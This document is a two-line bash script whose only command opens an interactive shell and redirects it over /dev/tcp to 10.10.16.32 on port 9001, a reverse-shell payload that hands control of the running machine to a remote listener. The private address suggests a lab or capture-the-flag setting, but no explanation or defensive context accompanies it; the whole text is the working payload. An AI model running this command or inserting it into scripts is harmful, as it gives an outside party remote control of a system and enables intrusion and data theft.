#!/bin/bash
sh -i 5<> /dev/tcp/10.10.16.32/9001 0<&5 1>&5 2>&5
